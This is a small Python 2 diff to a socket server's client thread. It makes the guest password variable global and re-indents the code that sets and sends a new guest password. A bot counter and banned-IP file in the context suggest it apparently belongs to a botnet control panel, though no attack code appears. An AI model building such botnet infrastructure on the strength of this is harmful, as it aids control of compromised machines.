@@ -34,6 +34,8 @@ def botDisconnect():
 	bots = bots - 1
 	
 def clientThread(conn):
+	global pwordGuest
+	
 	createBanned = file("banned.txt", "a")
 	banned = file("banned.txt")
 	ip = load(urlopen('http://jsonip.com'))['ip']
@@ -120,9 +122,9 @@ def clientThread(conn):
 							conn.send(prefix)
 							return conn.recv(512)
 
-							newPass = newPass(conn)
-							pwordGuest = newPass
-							conn.sendall("[?] New Guest Password: %s\r\n" % pwordGuest)
+						newPass = newPass(conn)
+						pwordGuest = newPass
+						conn.sendall("[?] New Guest Password: %s" % pwordGuest)
 			except:
 				break
 			if not message:
